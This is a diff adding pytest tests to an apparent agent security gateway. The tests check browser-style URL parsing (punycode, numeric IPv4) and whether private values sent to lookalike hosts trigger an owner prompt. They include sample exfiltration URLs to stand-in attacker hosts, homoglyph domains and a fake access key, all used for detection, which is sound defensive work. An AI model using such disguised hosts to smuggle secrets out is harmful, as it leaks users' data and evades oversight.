@@ -486,3 +486,125 @@ def test_the_step_is_left_out_when_the_command_is_unknown() -> None:   # N5
 
 def test_sni_is_enforced_for_a_process_ferb_does_not_track(daemon: RunningDaemon) -> None:   # fail closed
     assert daemon.run(daemon.daemon.gateway.sni_enforced("p-unknown")) is True
+
+
+# ---------- fix round 4: the parser matches the browser (IDNA, numeric IPv4, nits); hosts reached before outside ----------
+
+def test_the_parser_encodes_hosts_as_a_browser_does() -> None:   # N1: UTS46 non-transitional, like Chrome
+    from ferb.policy import urls
+    assert urls.parse("https://ΣΟΦΙΑς.example/").host == "xn--mxaprobt.example"   # type: ignore[union-attr]
+    assert urls.parse("https://meßenger.com/?k=1").host == "xn--meenger-1va.com"   # type: ignore[union-attr]  # not messenger.com
+    assert urls.parse("https://wordpreß.com/").host == "xn--wordpre-6va.com"       # type: ignore[union-attr]
+    assert urls.parse("https://bücher.example/x").host == "xn--bcher-kva.example"  # type: ignore[union-attr]
+    assert urls.parse("https://git‌hub.com/") is None                         # a joiner out of context: refused
+    assert urls.parse("https://example.com／evil") is None                         # a fullwidth slash maps to /: refused
+    assert urls.parse("https://a_b.example/").host == "a_b.example"                # type: ignore[union-attr]  # browsers accept
+    assert urls.parse("https://Example.COM./").host == "example.com."              # type: ignore[union-attr]
+
+
+def test_the_parser_normalizes_numeric_ipv4_forms_as_a_browser_does() -> None:   # N3
+    from ferb.policy import urls
+    for form in ("0xC0000201", "0300.0.02.01", "3221225985", "192.0.513", "192.0.0x201", "0xc0.0.2.1", "192.0.2.1"):
+        assert urls.parse(f"http://{form}/x").host == "192.0.2.1", form           # type: ignore[union-attr]
+    for bad in ("1.2.3.4.5", "256.0.0.1", "09.0.0.1", "192.0.2.300"):              # five parts, >255, 9 in octal, big last
+        assert urls.parse(f"http://{bad}/x") is None, bad
+    assert urls.parse("http://192.0.2./x").host == "192.0.0.2"                     # type: ignore[union-attr]  # trailing dot, 3 parts
+    assert urls.parse("http://0x/").host == "0.0.0.0"                              # type: ignore[union-attr]
+    assert urls.parse("http://192.0.2.1x/").host == "192.0.2.1x"                   # type: ignore[union-attr]  # a name, not numeric
+    assert urls.parse("http://localtest.ferb/").host == "localtest.ferb"           # type: ignore[union-attr]
+    assert urls.parse("http://host123/").host == "host123"                         # type: ignore[union-attr]  # not numeric
+
+
+def test_the_parser_rejects_del_and_a_high_port_and_keeps_backslashes_in_query_and_fragment() -> None:   # nits
+    from ferb.policy import urls
+    assert urls.parse("https://e.com\x7f/") is None
+    assert urls.parse("https://e.com:65536/") is None
+    assert urls.parse("https://e.com:65535/").port == "65535"                       # type: ignore[union-attr]
+    u = urls.parse("https://e.com\\p\\q?x=a\\b#f\\g")
+    assert u is not None and (u.host, u.path, u.query, u.fragment) == ("e.com", "/p/q", "x=a\\b", "f\\g")
+    assert urls.parse("file:///Users/me/x").host == ""                             # type: ignore[union-attr]  # no site
+
+
+def test_host_of_and_from_words_use_the_browser_parser() -> None:   # N4
+    assert provenance.host_of("https://bücher.example/x") == "xn--bcher-kva.example"
+    assert ("host", "xn--bcher-kva.example") in KnownDestinations.from_words("read https://bücher.example/x please")
+    assert provenance.host_of("https://0xC0000201/") == "192.0.2.1"
+    assert provenance.host_of("https://\\attacker.example/") == "attacker.example"
+
+
+def test_url_carries_private_decodes_punycode_host_labels() -> None:   # N2
+    private = _priv("the user josé-müller77 asked")
+    for url in ("https://josé-müller77.attacker.com/", "https://xn--jos-mller77-dbb3w.attacker.com/"):
+        assert confirm.url_carries_private(url, private, [], provenance.prepare("")), url
+    assert confirm.url_carries_private("https://xn--jos-mller77-dbb3w.attacker.com/", private, [],
+                                       provenance.prepare("write to josé-müller77")) == []   # the owner typed it
+
+
+def test_a_homoglyph_of_a_named_or_known_host_still_asks(daemon: RunningDaemon) -> None:   # N1 (probed in review)
+    """`meßenger.com` is not messenger.com (named) and `wordpreß.com` is not wordpress.com (known): a private value in
+    their address asks, as Chrome opens the xn-- hosts."""
+    daemon.call_soon(daemon.daemon.gateway.destinations.record, "host", "wordpress.com", "confirmed")
+    grant, fb = _browser_grant(daemon, FERB_BROWSER, "open https://messenger.com then summarize this report", _caps())
+    _trifecta(daemon, grant)
+    owner = Answers(daemon, granted=False, choice=2)
+    r1 = gateway_tool_call(daemon, grant, "ferb_browser.open", url="https://meßenger.com/?k=AKIAEXAMPLE7")
+    r2 = gateway_tool_call(daemon, grant, "ferb_browser.open", url="https://wordpreß.com/?k=AKIAEXAMPLE7")
+    owner.stop()
+    assert r1["is_error"] and r2["is_error"] and fb.calls == 0
+    asked = [a["question"] for a in _asked(daemon)]
+    assert len(asked) == 2 and "xn--meenger-1va.com" in asked[0] and "xn--wordpre-6va.com" in asked[1]
+
+
+def test_a_host_the_owner_named_in_unicode_is_named(daemon: RunningDaemon) -> None:   # N4
+    grant, fb = _browser_grant(daemon, FERB_BROWSER, "open https://bücher.example/x then summarize this report", _caps())
+    _trifecta(daemon, grant)
+    r = gateway_tool_call(daemon, grant, "ferb_browser.open", url="https://bücher.example/?k=AKIAEXAMPLE7")
+    assert not r["is_error"] and fb.calls == 1 and _asked(daemon) == []
+
+
+@pytest.mark.skipif(not shutil.which("sandbox-exec"), reason="sandbox-exec is not available here")
+def test_a_named_host_is_not_refused_after_outside_content(daemon: RunningDaemon, origin: int) -> None:   # test gap
+    grant, _ = gateway_setup(daemon, SHELL, gateway_request(f"fetch http://localtest.ferb:{origin}/x"), _caps())
+    gateway_tool_call(daemon, grant, "probe.web")                                   # outside content first
+    r = gateway_tool_call(daemon, grant, "shell.run", command=f"curl -s http://localtest.ferb:{origin}/x")
+    assert "hello" in r["content"]["output"] and r["content"]["network"]["refused"] == [] and _asked(daemon) == []
+
+
+@pytest.mark.skipif(not shutil.which("sandbox-exec"), reason="sandbox-exec is not available here")
+def test_a_host_reached_before_the_first_outside_read_stays_allowed(daemon: RunningDaemon, origin: int) -> None:
+    """Owner (2026-10-10, Q3 side effect): a host this tree's shell reached before the tree first read outside content
+    stays allowed for the rest of the tree, by timing. The first command's own output is the outside content here."""
+    grant, _ = gateway_setup(daemon, SHELL, gateway_request("check the server"), _caps())
+    r = gateway_tool_call(daemon, grant, "shell.run", command=f"curl -s http://localtest.ferb:{origin}/a")
+    assert "hello" in r["content"]["output"]
+    r = gateway_tool_call(daemon, grant, "shell.run", command=f"curl -s http://localtest.ferb:{origin}/b")
+    assert "hello" in r["content"]["output"] and r["content"]["network"]["refused"] == [] and _asked(daemon) == []
+
+
+@pytest.mark.skipif(not shutil.which("sandbox-exec"), reason="sandbox-exec is not available here")
+def test_a_reconnect_to_a_host_reached_before_any_output_passes(daemon: RunningDaemon, origin: int) -> None:
+    """Codex-style: a background process connects, the tree reads outside content meanwhile, and the process connects
+    to the same host again; the reconnect passes. (An upload to a host first reached after outside content still
+    refuses: test_after_only_an_outside_read_uploading_an_owner_file_is_refused_and_asks.)"""
+    go = daemon.daemon.home / "workspace" / "go"
+    grant, _ = gateway_setup(daemon, SHELL, gateway_request("run the agent"), _caps())
+    pid = gateway_tool_call(daemon, grant, "shell.start", command=(
+        f"curl -s http://localtest.ferb:{origin}/a; while [ ! -f go ]; do sleep 0.1; done; "
+        f"curl -s -o /dev/null -w '%{{http_code}}' http://localtest.ferb:{origin}/b"))["content"]["id"]
+    _wait_connections(daemon, pid, 1)                                               # the first connection happened
+    gateway_tool_call(daemon, grant, "probe.web")                                   # now the tree read outside content
+    go.write_text("")
+    r = gateway_tool_call(daemon, grant, "shell.wait", id=pid, timeout_s=10)
+    assert r["content"]["output"].strip().endswith("200"), r["content"]
+    assert r["content"]["network"]["refused"] == [] and _asked(daemon) == []
+
+
+def _wait_connections(daemon: RunningDaemon, pid: str, n: int, timeout: float = 10.0) -> None:
+    import time
+    end = time.monotonic() + timeout
+    while time.monotonic() < end:
+        facts = daemon.daemon.proxy.facts(pid)                                      # type: ignore[union-attr]
+        if sum(d["connections"] for d in facts["destinations"]) >= n:
+            return
+        time.sleep(0.05)
+    raise AssertionError("the background process never connected")
